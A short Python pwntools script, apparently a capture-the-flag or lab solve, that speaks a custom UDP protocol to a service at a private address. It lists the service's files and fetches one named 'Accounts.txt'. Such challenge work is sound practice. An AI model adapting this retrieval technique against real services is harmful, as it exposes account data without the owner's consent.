from pwn import *
import base64

host, port = "10.1.2.226", 9999
context.log_level = 'debug'

io = remote(host, port, typ=socket.SOCK_DGRAM)

# 0x3 for list
io.send(p64(0x3))

io.recv(4)
res = base64.b64decode(io.recvuntil(b'=').decode()).decode()
log.info("Response:\n%s", res)

# 0x2 for get file
payload = base64.b64encode(b"Accounts.txt")
payload = p32(0x2) + p8(len(payload)) + payload 
io.send(payload)

io.recv(5)
res = base64.b64decode(io.recvuntil(b'=').decode()).decode()
log.info("Response:\n%s", res)

io.interactive()